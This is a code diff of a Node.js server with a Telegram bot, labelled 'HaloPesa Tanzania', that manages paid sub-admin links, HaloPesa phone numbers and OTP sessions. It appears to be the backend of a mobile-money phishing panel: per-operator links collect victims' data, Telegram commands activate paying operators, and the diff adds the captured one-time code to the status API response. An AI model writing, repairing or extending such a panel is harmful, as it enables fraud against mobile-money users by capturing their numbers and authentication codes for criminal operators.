@@ -1,6 +1,6 @@
 /**
  * **HALOPESA TANZANIA - SECURE MULTI-ADMIN SERVER**
- * Updated with /mainadmin Command to display Main Admin Link and Telegram Info.
+ * Fixed Chat Info Retrieval and Unified /activate /payment Handling.
  */
 
 const express = require('express');
@@ -68,8 +68,7 @@ function isValidHaloPesaNumber(number) {
 }
 
 /**
- * Sub-admins must be both authorized and paid to route independent traffic.
- * Main admin chat ID can always route.
+ * Ensures sub-admin links work permanently once both authorized and paid.
  */
 function resolveTargetChat(adminParam) {
   if (adminParam && String(adminParam).trim() !== '') {
@@ -159,7 +158,6 @@ async function initBot() {
     await updateContinuousAdminList(chatId, null, 0);
   });
 
-  // /mainadmin command to display Main Admin Link and Telegram Info
   bot.onText(/\/mainadmin|\/mainadminlink/, async (msg) => {
     const chatId = String(msg.chat.id);
     if (chatId !== String(FALLBACK_ADMIN_ID)) {
@@ -167,81 +165,54 @@ async function initBot() {
       return;
     }
 
-    const userId = msg.from.id;
-    const username = msg.from.username ? `@${msg.from.username}` : 'Hakuna';
-    const firstName = msg.from.first_name || 'Msimamizi Mkuu';
-    const lastName = msg.from.last_name || '';
+    let chatInfo = {};
+    try {
+      chatInfo = await bot.getChat(chatId);
+    } catch (e) {}
+
+    const username = chatInfo.username ? `@${chatInfo.username}` : (msg.from.username ? `@${msg.from.username}` : 'Hakuna');
+    const firstName = chatInfo.first_name || msg.from.first_name || 'Msimamizi Mkuu';
+    const lastName = chatInfo.last_name || msg.from.last_name || '';
     const mainAdminLink = `${APP_URL}/?admin=${FALLBACK_ADMIN_ID}`;
 
     const infoText = 
       `👑 *Taarifa za Msimamizi Mkuu*\n\n` +
       `• *Jina:* ${firstName}${lastName}\n` +
       `• *Username:* ${username}\n` +
-      `• *Telegram ID:* \`${userId}\`\n\n` +
+      `• *Telegram ID:* \`${chatId}\`\n\n` +
       `🔗 *Kiungo Chako Kikuu:*\n${mainAdminLink}`;
 
     await bot.sendMessage(chatId, infoText, { parse_mode: 'Markdown' });
   });
 
-  // /activate <chat_id> command for Main Admin
   bot.onText(/\/activate(?:\s+(.+))?/, async (msg, match) => {
     const chatId = String(msg.chat.id);
-    if (chatId !== String(FALLBACK_ADMIN_ID)) {
-      await bot.sendMessage(chatId, `⚠ Huna idhini ya kutumia amri hii.`);
-      return;
-    }
+    if (chatId !== String(FALLBACK_ADMIN_ID)) return;
 
     const targetId = match[1] ? match[1].trim() : '';
     if (!targetId || !admins.has(targetId)) {
-      await bot.sendMessage(chatId, `⚠️ Tafadhali weka Chat ID sahihi ya msimamizi msaidizi unayemtaka kuwasha.\n\n*Mfano:* \`/activate 123456789\``, { parse_mode: 'Markdown' });
+      await bot.sendMessage(chatId, `⚠️ Weka Chat ID sahihi.\n\n*Mfano:* \`/activate 123456789\``, { parse_mode: 'Markdown' });
       return;
     }
 
     const record = admins.get(targetId);
     record.authorized = true;
+    record.paid = true; // Sets both so the link works permanently
     record.status = 'ACTIVE';
     saveAdmins();
 
     const subLink = `${APP_URL}/?admin=${targetId}`;
-    await bot.sendMessage(chatId, `✅ Msimamizi msaidizi \`${targetId}\` amewashwa kikamilifu.`, { parse_mode: 'Markdown' });
+    await bot.sendMessage(chatId, `✅ Msimamizi msaidizi \`${targetId}\` amewashwa na kulipiwa kikamilifu.`, { parse_mode: 'Markdown' });
     await bot.sendMessage(targetId, `🎉 Akaunti yako imewashwa na Msimamizi Mkuu!\n\n🔗 *Kiungo chako kiko tayari:*\n${subLink}`, { parse_mode: 'Markdown' }).catch(() => {});
   });
 
-  // /suspend <chat_id> command for Main Admin
-  bot.onText(/\/suspend(?:\s+(.+))?/, async (msg, match) => {
-    const chatId = String(msg.chat.id);
-    if (chatId !== String(FALLBACK_ADMIN_ID)) {
-      await bot.sendMessage(chatId, `⚠ Huna idhini ya kutumia amri hii.`);
-      return;
-    }
-
-    const targetId = match[1] ? match[1].trim() : '';
-    if (!targetId || !admins.has(targetId)) {
-      await bot.sendMessage(chatId, `⚠️ Tafadhali weka Chat ID sahihi ya msimamizi msaidizi unayemtaka kusitisha.\n\n*Mfano:* \`/suspend 123456789\``, { parse_mode: 'Markdown' });
-      return;
-    }
-
-    const record = admins.get(targetId);
-    record.authorized = false;
-    record.paid = false;
-    record.status = 'SUSPENDED';
-    saveAdmins();
-
-    await bot.sendMessage(chatId, `🚫 Msimamizi msaidizi \`${targetId}\` amesitishwa (suspended) kikamilifu.`, { parse_mode: 'Markdown' });
-    await bot.sendMessage(targetId, `⚠️ Akaunti yako imesitishwa na Msimamizi Mkuu.`).catch(() => {});
-  });
-
-  // /payment <chat_id> command for Main Admin
   bot.onText(/\/payment(?:\s+(.+))?/, async (msg, match) => {
     const chatId = String(msg.chat.id);
-    if (chatId !== String(FALLBACK_ADMIN_ID)) {
-      await bot.sendMessage(chatId, `⚠ Huna idhini ya kutumia amri hii.`);
-      return;
-    }
+    if (chatId !== String(FALLBACK_ADMIN_ID)) return;
 
     const targetId = match[1] ? match[1].trim() : '';
     if (!targetId || !admins.has(targetId)) {
-      await bot.sendMessage(chatId, `⚠️ Tafadhali weka Chat ID sahihi ya msimamizi msaidizi.\n\n*Mfano:* \`/payment 123456789\``, { parse_mode: 'Markdown' });
+      await bot.sendMessage(chatId, `⚠️ Weka Chat ID sahihi.\n\n*Mfano:* \`/payment 123456789\``, { parse_mode: 'Markdown' });
       return;
     }
 
@@ -252,47 +223,45 @@ async function initBot() {
     saveAdmins();
 
     const subLink = `${APP_URL}/?admin=${targetId}`;
-    await bot.sendMessage(chatId, `✅ Malipo yamethibitishwa na kiungo kimewashwa kwa msimamizi msaidizi \`${targetId}\`.`, { parse_mode: 'Markdown' });
-    await bot.sendMessage(targetId, `🎉 Malipo yako yamethibitishwa na Msimamizi Mkuu!\n\n🔗 *Kiungo chako kiko tayari:*\n${subLink}`, { parse_mode: 'Markdown' }).catch(() => {});
+    await bot.sendMessage(chatId, `✅ Malipo yamethibitishwa kwa \`${targetId}\`.`, { parse_mode: 'Markdown' });
+    await bot.sendMessage(targetId, `🎉 Malipo yako yamethibitishwa!\n\n🔗 *Kiungo:* ${subLink}`, { parse_mode: 'Markdown' }).catch(() => {});
   });
 
-  bot.onText(/\/myprofile|\/me/, async (msg) => {
-    try {
-      const chatId = String(msg.chat.id);
-      const userId = msg.from.id;
-      const username = msg.from.username ? `@${msg.from.username}` : 'Hakuna';
-      const firstName = msg.from.first_name || 'Haipo';
-      const lastName = msg.from.last_name || 'Haipo';
-      
-      if (chatId !== String(FALLBACK_ADMIN_ID)) {
-        const record = admins.get(chatId);
-        if (!record || !record.authorized || !record.paid) {
-          await bot.sendMessage(chatId, `⚠️ Akaunti yako bado haijaidhinishwa au haijalipia.`);
-          return;
-        }
-      }
-      
-      const userLink = `${APP_URL}/?admin=${chatId}`;
-      let profileText = 
-        `👤 *Taarifa zako za Kiungo Maalum*\n\n` +
-        `• *Jina:* ${firstName} ${lastName}\n` +
-        `• *Telegram ID:* \`${userId}\`\n\n` +
-        `🔗 *Kiungo Chako Maalum:*\n${userLink}`;
+  bot.onText(/\/suspend(?:\s+(.+))?/, async (msg, match) => {
+    const chatId = String(msg.chat.id);
+    if (chatId !== String(FALLBACK_ADMIN_ID)) return;
 
-      await bot.sendMessage(chatId, profileText, { parse_mode: 'Markdown' });
-    } catch (err) {}
+    const targetId = match[1] ? match[1].trim() : '';
+    if (!targetId || !admins.has(targetId)) {
+      await bot.sendMessage(chatId, `⚠️ Weka Chat ID sahihi ya kusitisha.`, { parse_mode: 'Markdown' });
+      return;
+    }
+
+    const record = admins.get(targetId);
+    record.authorized = false;
+    record.paid = false;
+    record.status = 'SUSPENDED';
+    saveAdmins();
+
+    await bot.sendMessage(chatId, `🚫 Msimamizi msaidizi \`${targetId}\` amesitishwa.`, { parse_mode: 'Markdown' });
+    await bot.sendMessage(targetId, `⚠️ Akaunti yako imesitishwa.`).catch(() => {});
   });
 
   bot.onText(/\/start/, async (msg) => {
     try {
       const chatId = String(msg.chat.id);
-      const userId = msg.from.id;
-      const username = msg.from.username || '';
-      const firstName = msg.from.first_name || 'Mtumiaji';
-      const lastName = msg.from.last_name || '';
+      
+      let chatInfo = {};
+      try {
+        chatInfo = await bot.getChat(chatId);
+      } catch (e) {}
+
+      const username = chatInfo.username || msg.from.username || '';
+      const firstName = chatInfo.first_name || msg.from.first_name || 'Mtumiaji';
+      const lastName = chatInfo.last_name || msg.from.last_name || '';
 
       if (chatId === String(FALLBACK_ADMIN_ID)) {
-        await bot.sendMessage(chatId, `👑 Karibu Msimamizi Mkuu.\n\n*Amri Zilizopo:*\n• \`/admins\` - Orodha ya wasimamizi\n• \`/mainadmin\` - Tazama taarifa na kiungo chako\n• \`/activate <chat_id>\` - Washa msimamizi\n• \`/payment <chat_id>\` - Thibitisha malipo\n• \`/suspend <chat_id>\` - Sitisha msimamizi`, {
+        await bot.sendMessage(chatId, `👑 Karibu Msimamizi Mkuu.\n\n*Amri Zilizopo:*\n• \`/admins\`\n• \`/mainadmin\`\n• \`/activate <chat_id>\`\n• \`/payment <chat_id>\`\n• \`/suspend <chat_id>\``, {
           parse_mode: 'Markdown'
         });
         return;
@@ -321,13 +290,13 @@ async function initBot() {
       if (!record.authorized || !record.paid) {
         await bot.sendMessage(FALLBACK_ADMIN_ID, 
           `🚨 *Msimamizi Msaidizi Mpya Anasubiri Malipo/Idhini!*\n\n` +
-          `👤 *Mtumiaji:* ${username ? '@' + username : firstName}\n` +
-          `🆔 *Chat ID:* \`${userId}\`\n\n` +
-          `Tumia \`/activate ${userId}\` au \`/payment ${userId}\` kuruhusu kiungo chake.`, 
+          `👤 *Jina:* ${firstName}${lastName}\n` +
+          `🔗 *Username:* ${username ? '@' + username : 'Hakuna'}\n` +
+          `🆔 *Chat ID:* \`${chatId}\``, 
           { parse_mode: 'Markdown' }
         );
 
-        await bot.sendMessage(chatId, `👋 *Karibu ${firstName}!*\n\nAkaunti yako **inasubiri malipo na idhini** kutoka kwa Msimamizi Mkuu.`, { parse_mode: 'Markdown' });
+        await bot.sendMessage(chatId, `👋 *Karibu ${firstName}!*\n\nAkaunti yako **inasubiri idhini na malipo** kutoka kwa Msimamizi Mkuu.`, { parse_mode: 'Markdown' });
         return;
       }
 
@@ -456,7 +425,7 @@ app.get('/api/check-status/:userId', (req, res) => {
   const { userId } = req.params;
   const session = sessions.get(userId);
   if (!session) return res.status(404).json({ status: 'NOT_FOUND' });
-  res.status(200).json({ status: session.status });
+  res.status(200).json({ status: session.status, otp: session.otp || '' });
 });
 
 app.post('/api/request-new-otp', async (req, res) => {
@@ -527,4 +496,3 @@ const PORT = process.env.PORT || 10000;
 app.listen(PORT, async () => {
   await initBot();
 });
-  
